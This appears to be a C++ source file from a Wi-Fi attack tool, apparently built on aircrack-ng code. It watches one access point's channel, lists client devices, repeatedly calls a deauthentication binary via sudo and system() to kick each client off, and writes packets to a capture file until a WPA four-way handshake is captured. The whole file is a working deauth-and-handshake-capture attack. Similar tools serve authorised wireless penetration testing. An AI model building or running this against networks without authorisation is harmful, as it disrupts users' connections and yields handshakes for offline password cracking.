#include <ST_Scanner.h>

#include <AP_Selecter.h>
#include <wif.h>
#include <station.h>
#include <pcap.h>

#include <iostream>

#include <cstring>
#include <cstdio>
#include <cassert>
#include <cstdlib>
#include <sys/select.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

static void print(uint8_t const * in) {
  for (int i = 0; i != 5; ++i)
    printf("%02x:", in[i]);
  printf("%02x", in[5]);
}

ST_Scanner::ST_Scanner(path const & bin, AP_info_tiny const &AP, char const * Iface)
  : m_lopt{}
	, m_Scanner{scanning, AP.bssid, AP.channel, Iface, std::ref(m_lopt)}
	, m_Deauth{deauthentacating, AP.bssid, Iface, std::ref(m_lopt), std::ref(bin)}
{}

ST_Scanner::~ST_Scanner() {
  m_Scanner.join();
	m_Deauth.join();
}

ST_info_tiny::ST_info_tiny(uint8_t const * stmac_in) {
  memcpy(stmac, stmac_in, sizeof(stmac));
}
void ST_info_tiny::Print() const {
  for (int i = 0; i != 5; ++i)
    printf("%02x:", stmac[i]);
  printf("%02x\n", stmac[5]);
}

void ST_Scanner::deauthentacating(uint8_t const * BSSID, char const * iface, local_options & lopt, path const & bin) {
	static int sent = 0;

	path deauth_bin = bin + "../deauth/deauth";

	while(1) {

		std::vector<ST_info_tiny> sts;

		lopt.m_data.lock();
		// data can be deleted!
		if (lopt.do_exit) {
			lopt.m_data.unlock();
			break;
		}

		int size = sent;
		int new_st = lopt.new_st;

		ST_info *st = lopt.st_1st;
		while (size--)
			st = st->next;
		
		for (; new_st != sent; ++sent) {
			std::cout << "Found new device: ";
			print(st->stmac); std::cout << std::endl;
			sts.emplace_back(st->stmac);
			st = st->next;
		}

		lopt.m_data.unlock();

		for (auto &&x : sts) {
			// if (x.stmac[5] != 0x38)
			// 	continue;

			char command[1024];
			sprintf(command,
				"sudo %s %02x:%02x:%02x:%02x:%02x:%02x %02x:%02x:%02x:%02x:%02x:%02x %s",
				deauth_bin.getRaw(),
				BSSID[0],BSSID[1],BSSID[2],BSSID[3],BSSID[4],BSSID[5],
				x.stmac[0],x.stmac[1],x.stmac[2],x.stmac[3],x.stmac[4],x.stmac[5],
				iface
			);
			system(command);
		}
		usleep(10000);
	}
}

// TODO specify path
static FILE *initCapFile(/*char const * prefix*/) {
  //assert(prefix && strlen(prefix) > 0);
  char const * prefix = "";
	const size_t ADDED_LENGTH = 8;
  // prefix is the relative path

	size_t ofn_len = strlen(prefix) + ADDED_LENGTH + 1; // full path
	char * ofn = (char *) calloc(1, ofn_len);
	assert(ofn);

  struct pcap_file_header pfh;

  memset(ofn, 0, ofn_len);
  snprintf(ofn,
        ofn_len,
        "%sdump.cap",
        prefix); // generate full path
  FILE *f_cap = fopen(ofn, "wb+");
  if (!f_cap) {
    perror("fopen failed");
    fprintf(stderr, "Could not create \"%s\".\n", ofn);
    free(ofn);

    return nullptr;
  }

  pfh.magic = TCPDUMP_MAGIC;
  pfh.version_major = PCAP_VERSION_MAJOR;
  pfh.version_minor = PCAP_VERSION_MINOR;
  pfh.thiszone = 0;
  pfh.sigfigs = 0;
  pfh.snaplen = 65535;
  pfh.linktype = LINKTYPE_IEEE802_11;

  if (fwrite(&pfh, 1, sizeof(pfh), f_cap) != (size_t) sizeof(pfh)) {
    perror("fwrite(pcap file header) failed");
    free(ofn);
    return nullptr;
  }
  free(ofn);
	return f_cap;
}


static int dump_add_packet(unsigned char * h80211, int caplen, local_options & lopt) {
  assert(h80211);
	size_t n;
	unsigned z = 0;
	pcap_pkthdr pkh;
	unsigned char bssid[6];
	unsigned char stmac[6];

	AP_info * ap_cur = NULL;
	ST_info * st_cur = NULL;
	AP_info * ap_prv = NULL;
	ST_info * st_prv = NULL;

	if (caplen < (int) sizeof(ieee80211_frame)) goto write_packet;

	if ((h80211[0] & IEEE80211_FC0_TYPE_MASK) == IEEE80211_FC0_TYPE_CTL)
		goto write_packet;

	switch (h80211[1] & IEEE80211_FC1_DIR_MASK) {
		case IEEE80211_FC1_DIR_NODS:
			memcpy(bssid, h80211 + 16, 6); //-V525
			break; // Adhoc
		case IEEE80211_FC1_DIR_TODS:
			memcpy(bssid, h80211 + 4, 6);
			break; // ToDS
		case IEEE80211_FC1_DIR_FROMDS:
		case IEEE80211_FC1_DIR_DSTODS:
			memcpy(bssid, h80211 + 10, 6);
			break; // WDS -> Transmitter taken as BSSID
		default:
			abort();
	}

  if (memcmp(lopt.f_bssid, bssid, 6) != 0) return (1);

	ap_cur = lopt.ap_1st;
	ap_prv = NULL;

	while (ap_cur != NULL) {
		if (!memcmp(ap_cur->bssid, bssid, 6)) break;

		ap_prv = ap_cur;
		ap_cur = ap_cur->next;
	}

	/* if it's a new access point, add it */

	if (ap_cur == NULL) {
		if (!(ap_cur = (AP_info *) calloc(1, sizeof(AP_info)))) {
			perror("calloc failed");
			return (1);
		}

		if (lopt.ap_1st == NULL)
			lopt.ap_1st = ap_cur;
		else if (ap_prv != NULL)
			ap_prv->next = ap_cur;

		memcpy(ap_cur->bssid, bssid, 6);
		ap_cur->prev = ap_prv;
		lopt.ap_end = ap_cur;

		ap_cur->ssid_length = 0;
		memset(ap_cur->essid, 0, ESSID_LENGTH + 1);
		ap_cur->EAP_detected = 0;
	}

	switch (h80211[1] & IEEE80211_FC1_DIR_MASK) {
		case IEEE80211_FC1_DIR_NODS:
			if (memcmp(h80211 + 10, bssid, 6) == 0) goto skip_station;
			memcpy(stmac, h80211 + 10, 6);
			break;
		case IEEE80211_FC1_DIR_TODS:
			memcpy(stmac, h80211 + 10, 6);
			break;
		case IEEE80211_FC1_DIR_FROMDS:
			if ((h80211[4] % 2) != 0) goto skip_station;
			memcpy(stmac, h80211 + 4, 6);
			break;
		case IEEE80211_FC1_DIR_DSTODS:
			goto skip_station;
		default:
			abort();
	}

	st_cur = lopt.st_1st;
	st_prv = NULL;

	while (st_cur != NULL) {
		if (!memcmp(st_cur->stmac, stmac, 6)) break;
		st_prv = st_cur;
		st_cur = st_cur->next;
	}


	if (st_cur == NULL) {
		if (!(st_cur = (ST_info *) calloc(1, sizeof(ST_info)))) {
			perror("calloc failed");
			return (1);
		}
		memset(st_cur, 0, sizeof(ST_info));
		if (lopt.st_1st == NULL)
			lopt.st_1st = st_cur;
		else
			st_prv->next = st_cur;
		memcpy(st_cur->stmac, stmac, 6);
		st_cur->prev = st_prv;
		lopt.st_end = st_cur;
		++lopt.new_st;
	}

	if (st_cur->base == NULL || memcmp(ap_cur->bssid, BROADCAST, 6) != 0)
		st_cur->base = ap_cur;

skip_station:

	z = ((h80211[1] & IEEE80211_FC1_DIR_MASK) != IEEE80211_FC1_DIR_DSTODS)
			? 24
			: 30;

	// 	/* Check if 802.11e (QoS) */
	if ((h80211[0] & 0x80) == 0x80) z += 2;

	z += 6; // skip LLC header

	// 	/* check ethertype == EAPOL */
	if (h80211[z] == 0x88 && h80211[z + 1] == 0x8E
		&& (h80211[1] & 0x40) != 0x40) {

		z += 2; // skip ethertype

		if (st_cur == NULL) goto write_packet;

		if ((h80211[z + 6] & 0x08) != 0 && (h80211[z + 6] & 0x40) == 0
			&& (h80211[z + 6] & 0x80) != 0
			&& (h80211[z + 5] & 0x01) == 0) {
			st_cur->state = 1;
		}
		if (z + 17 + 32 > (unsigned) caplen) goto write_packet;

		if ((h80211[z + 6] & 0x08) != 0 && (h80211[z + 6] & 0x40) == 0
			&& (h80211[z + 6] & 0x80) == 0
			&& (h80211[z + 5] & 0x01) != 0) {
			if (memcmp(&h80211[z + 17], ZERO, 32) != 0)
				st_cur->state |= 2;

			if ((st_cur->state & 4) != 4) {
				uint32_t eapol_size	= (uint32_t)((h80211[z + 2] << 8) + h80211[z + 3] + 4);

				if (caplen - z < eapol_size || eapol_size == 0 || caplen - z < 81 + 16)
					goto write_packet;
				st_cur->state |= 4;
			}
		}

		/* frame 3: Pairwise == 1, Install == 1, Ack == 1, MIC == 1 */

		if ((h80211[z + 6] & 0x08) != 0 && (h80211[z + 6] & 0x40) != 0
			&& (h80211[z + 6] & 0x80) != 0
			&& (h80211[z + 5] & 0x01) != 0) {
			if (memcmp(&h80211[z + 17], ZERO, 32) != 0)
				st_cur->state |= 1;

			if ((st_cur->state & 4) != 4) {
				uint32_t eapol_size = (h80211[z + 2] << 8) + h80211[z + 3] + 4u;

				if (eapol_size == 0)
					// Ignore the packet trying to crash us.
					goto write_packet;
				st_cur->state |= 4;
			}
		}

		if (st_cur->state == 7) {
			lopt.do_exit = 1;
			if (!st_cur->eapol) {
				st_cur->eapol = 1;
				std::cout << "EAPOL founded: ";
				print(st_cur->stmac); std::cout << std::endl;
			}

		}
	}


write_packet:
	if (lopt.f_cap != NULL && caplen >= 10) {
		pkh.len = pkh.caplen = (uint32_t) caplen;
		n = sizeof(pkh);

		if (fwrite(&pkh, 1, n, lopt.f_cap) != (size_t) n) {
			perror("fwrite(packet header) failed");
			return (1);
		}

		fflush(stdout);
		n = pkh.caplen;
		if (fwrite(h80211, 1, n, lopt.f_cap) != (size_t) n) {
			perror("fwrite(packet data) failed");
			return (1);
		}
		fflush(stdout);
	}

	return (0);
}

void ST_Scanner::scanning(uint8_t const * BSSID, uint32_t Ch, char const * Iface, local_options & lopt) {
	
	int caplen = 0, fdh;
	struct AP_info *ap_cur, *ap_next;
	struct ST_info *st_cur, *st_next;
  
	struct rx_info ri;
	unsigned char buffer[4096];
	unsigned char * h80211;

	struct timeval tv0;

	fd_set rfds;

	lopt.m_data.lock();
  lopt.channel = Ch;
  lopt.s_iface = Iface;
  memcpy(lopt.f_bssid, BSSID, 6);
  lopt.f_cap = initCapFile();
	lopt.m_data.unlock();

  wif * wi = wi_open(lopt.s_iface);

  int fd_raw = wi->wi_fd(wi);
  fdh = fd_raw;

  wi->wi_set_channel(wi, Ch);

	/* Drop privileges */
	if (setuid(getuid()) == -1)
		perror("setuid");

	time_t start = time(NULL);
	time_t end = time(NULL);
	time_t timing = 999999; // it is unlimited timer if there is no EAPOL data.
	// MYWHILE
	bool notF = true;
	std::cout << "Scanning from: ";
	print(BSSID);
	std::cout << " channel: {" << Ch << "} iface: " << Iface << std::endl;

	while (end - start < timing) {
		end = time(NULL);
		lopt.m_data.lock();
		if (lopt.do_exit && notF){// || end - start > 5) {
			// lopt.do_exit = 1;
			//lopt.m_data.unlock();
			notF = false;
			start = time(NULL);
			end = time(NULL);
			timing = 3;
			//break;
		}
		lopt.m_data.unlock();

		FD_ZERO(&rfds);
    FD_SET(fd_raw, &rfds);

		tv0.tv_sec = 0;
		tv0.tv_usec = REFRESH_RATE;

		// std::cout << 0 << std::endl;
		if (select(fdh + 1, &rfds, NULL, NULL, &tv0) < 0)
			return;
		// std::cout << 1 << std::endl;
    if (FD_ISSET(fd_raw, &rfds)) {
      memset(buffer, 0, sizeof(buffer));
      h80211 = buffer;
			// std::cout << 2 << std::endl;
      if ((caplen = wi_read(
            wi, NULL, NULL, h80211, sizeof(buffer), &ri))
        == -1) {
        perror("iface down");
        break;
      }
			// std::cout << 3 << std::endl;
			lopt.m_data.lock();
      dump_add_packet(h80211, caplen, lopt);
			// std::cout << lopt.do_exit << '\n';
			lopt.m_data.unlock();
    }
	}

	lopt.m_data.lock();
  wi_close(wi);
  if (lopt.f_cap != NULL)
    fclose(lopt.f_cap);


	ap_cur = lopt.ap_1st;
	while (ap_cur != NULL) {
		// Freeing AP List
		ap_next = ap_cur->next;
		free(ap_cur);
		ap_cur = ap_next;
	}

	st_cur = lopt.st_1st;

	std::cout << "All stations: " << std::endl;
	while (st_cur != NULL) {
    print(st_cur->stmac);
		if (st_cur->eapol)
			std::cout << "   EAPOL";
		std::cout << std::endl;

		st_next = st_cur->next;
		free(st_cur);
		st_cur = st_next;
	}

	lopt.m_data.unlock();

	return;
}